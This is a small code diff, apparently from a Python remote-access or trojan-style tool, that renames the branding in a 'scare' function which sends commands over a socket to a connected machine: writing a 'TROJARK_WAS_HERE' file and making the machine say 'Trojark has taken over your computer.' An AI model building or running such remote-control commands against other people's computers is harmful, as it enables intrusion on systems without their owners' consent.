@@ -11,5 +11,5 @@ def ip(clientsocket: socket.socket, address: tuple):
 
 
 def scare(clientsocket: socket.socket, address: tuple):
-    send_command(clientsocket, 'echo "" > MAHJESTIC_WAS_HERE')
-    send_command(clientsocket, "say Mahjestic has hacked you!")
+    send_command(clientsocket, 'echo "" > TROJARK_WAS_HERE')
+    send_command(clientsocket, "say Trojark has taken over your computer.")
